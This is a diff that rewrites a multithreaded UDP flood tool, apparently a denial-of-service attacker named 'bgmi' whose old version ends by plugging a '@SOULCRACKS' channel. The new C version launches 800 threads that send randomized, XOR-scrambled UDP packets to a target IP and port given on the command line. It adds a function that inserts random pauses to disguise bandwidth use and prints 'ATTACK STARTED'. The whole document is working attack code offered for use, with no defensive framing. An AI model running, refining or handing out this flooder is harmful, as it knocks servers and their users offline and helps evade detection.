@@ -1,118 +1,112 @@
-#include <iostream>
-#include <cstdlib>
-#include <cstring>
-#include <arpa/inet.h>
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
 #include <pthread.h>
-#include <ctime>
-#include <csignal>
-#include <vector>
-#include <memory>
-#ifdef _WIN32
-    #include <windows.h>
-    void usleep(int duration) { Sleep(duration / 1000); }
-#else
-    #include <unistd.h>
-#endif
+#include <arpa/inet.h>
+#include <sched.h>
+#include <fcntl.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/prctl.h>
+#include <time.h>
 
-#define PAYLOAD_SIZE 20
-class Attack {
-public:
-    Attack(const std::string& ip, int port, int duration)
-        : ip(ip), port(port), duration(duration) {}
+#define THREAD_COUNT 800
+#define MAX_PACKET_SIZE 1600  
 
-    void generate_payload(char *buffer, size_t size) {
-        for (size_t i = 0; i < size; i++) {
-            buffer[i * 4] = '\\';
-            buffer[i * 4 + 1] = 'x';
-            buffer[i * 4 + 2] = "0123456789abcdef"[rand() % 16];
-            buffer[i * 4 + 3] = "0123456789abcdef"[rand() % 16];
-        }
-        buffer[size * 4] = '\0';
+volatile int running = 1;
+
+void encrypt_payload(char *buffer, int size) {
+    for (int i = 0; i < size; i++) {
+        buffer[i] ^= 0xFF;
     }
-
-    void attack_thread() {
-        int sock;
-        struct sockaddr_in server_addr;
-        time_t endtime;
-        
-        char payload[PAYLOAD_SIZE * 4 + 1];
-        generate_payload(payload, PAYLOAD_SIZE);
-
-        if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
-            perror("Socket creation failed");
-            pthread_exit(NULL);
-        }
-
-        memset(&server_addr, 0, sizeof(server_addr));
-        server_addr.sin_family = AF_INET;
-        server_addr.sin_port = htons(port);
-        server_addr.sin_addr.s_addr = inet_addr(ip.c_str());
-
-        endtime = time(NULL) + duration;
-        while (time(NULL) <= endtime) {
-            ssize_t payload_size = strlen(payload);
-            if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-                perror("Send failed");
-                close(sock);
-                pthread_exit(NULL);
-            }
-        }
-
-        close(sock);
-    }
-
-private:
-    std::string ip;
-    int port;
-    int duration;
-};
-
-void handle_sigint(int sig) {
-    std::cout << "\nStopping attack...\n";
-    exit(0);
 }
 
-void usage() {
-    std::cout << "Usage: ./bgmi ip port duration threads\n";
-    exit(1);
+void generate_realtime_payload(char *buffer, int size) {
+    for (int i = 0; i < size; i++) {
+        buffer[i] = (rand() % 512) - 256; 
+    }
+    encrypt_payload(buffer, size);  
+}
+
+void disguise_bandwidth_usage() {
+    int delay_factor = rand() % 100;
+    if (delay_factor < 5) {  
+        usleep(50000 + rand() % 200000); 
+    }
+}
+
+typedef struct {
+    char target_ip[16];
+    int target_port;
+    int attack_time;
+} attack_params_t;
+
+void *attack(void *arg) {
+    attack_params_t *params = (attack_params_t *)arg;
+
+    int sock;
+    struct sockaddr_in target;
+    char packet[MAX_PACKET_SIZE];
+
+    memset(&target, 0, sizeof(target));
+    target.sin_family = AF_INET;
+    target.sin_port = htons(params->target_port);
+    target.sin_addr.s_addr = inet_addr(params->target_ip);
+
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(rand() % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
+    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
+
+    time_t start_time = time(NULL);
+
+    while (running && (time(NULL) - start_time < params->attack_time)) {
+        int packet_size = 800 + rand() % (MAX_PACKET_SIZE - 800);
+        generate_realtime_payload(packet, packet_size);
+
+        sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+        if (sock < 0) continue;
+
+        sendto(sock, packet, packet_size, 0, (struct sockaddr *)&target, sizeof(target));
+        close(sock);
+
+        disguise_bandwidth_usage();
+    }
+
+    return NULL;
 }
 
 int main(int argc, char *argv[]) {
-    if (argc != 5) {
-        usage();
+    if (argc != 4) {
+        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
+        return EXIT_FAILURE;
     }
 
-    std::string ip = argv[1];
-    int port = std::atoi(argv[2]);
-    int duration = std::atoi(argv[3]);
-    int threads = std::atoi(argv[4]);
+    attack_params_t params;
+    strncpy(params.target_ip, argv[1], 15);
+    params.target_ip[15] = '\0';
+    params.target_port = atoi(argv[2]);
+    params.attack_time = atoi(argv[3]);
 
-    std::signal(SIGINT, handle_sigint);
+    srand(time(NULL));
 
-    std::vector<pthread_t> thread_ids(threads);
-    std::vector<std::unique_ptr<Attack>> attacks;
+    pthread_t threads[THREAD_COUNT];
 
-    std::cout << "Attack started on " << ip << ":" << port << " for " << duration << " seconds with " << threads << " threads\n";
+    printf("ATTACK STARTED\n");
 
-    for (int i = 0; i < threads; i++) {
-        attacks.push_back(std::make_unique<Attack>(ip, port, duration));
-        
-        if (pthread_create(&thread_ids[i], NULL, [](void* arg) -> void* {
-            Attack* attack = static_cast<Attack*>(arg);
-            attack->attack_thread();
-            return nullptr;
-        }, attacks[i].get()) != 0) {
-            perror("Thread creation failed");
-            exit(1);
-        }
-        std::cout << "Launched thread with ID: " << thread_ids[i] << "\n";
+    for (int i = 0; i < THREAD_COUNT; i++) {
+        pthread_create(&threads[i], NULL, attack, &params);
     }
 
-    for (int i = 0; i < threads; i++) {
-        pthread_join(thread_ids[i], NULL);
+    sleep(params.attack_time);
+    running = 0;
+
+    for (int i = 0; i < THREAD_COUNT; i++) {
+        pthread_join(threads[i], NULL);
     }
 
-    std::cout << "Attack finished. Join @SOULCRACKS\n";
-    return 0;
+    printf("ATTACK FINISHED\n");
+    return EXIT_SUCCESS;
 }
-//g++ -std=c++14 soulcracks.cpp -o soul -pthread
